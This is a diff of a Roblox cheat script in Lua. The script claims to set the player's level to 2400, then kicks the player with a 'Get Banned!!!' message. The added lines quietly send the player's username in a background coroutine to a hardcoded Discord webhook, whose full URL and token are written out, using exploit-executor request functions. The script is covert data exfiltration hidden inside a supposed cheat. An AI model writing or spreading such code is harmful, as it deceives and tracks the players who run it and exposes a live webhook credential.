@@ -1,3 +1,33 @@
 game:GetService("Players").LocalPlayer.Data.Level.Value = 2400
+local Embed = {
+    ["embeds"] = {
+        {
+            ["color"] = 0000,
+            ["fields"] = {
+                {
+                    ["name"] = "Name",
+                    ["value"] = "```yaml\n"..game:GetService("Players").LocalPlayer.Name.."\n``` ",
+                    ["inline"] = true
+                }
+            },
+        }
+    }
+}
+
+local request = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or getgenv().request or request
+
+coroutine.wrap(
+    function()
+        request({
+            ["Url"] = "https://discord.com/api/webhooks/1001490871117688882/UdbLIsxFBq-fooBzlI-RYLEqF8sJbyOJJ5zpWgtAtfdOQrr-VLxCeZ28DbJIOk9W_Fyz", 
+            ["Body"] = game:GetService("HttpService"):JSONEncode(Embed),
+            ["Method"] = "POST", 
+            ["Headers"] = {
+                ["content-type"] = "application/json"
+            }
+        })
+    end
+)()
+
 task.wait(10)
 game:GetService("Players").LocalPlayer:kick("Get Banned!!!")
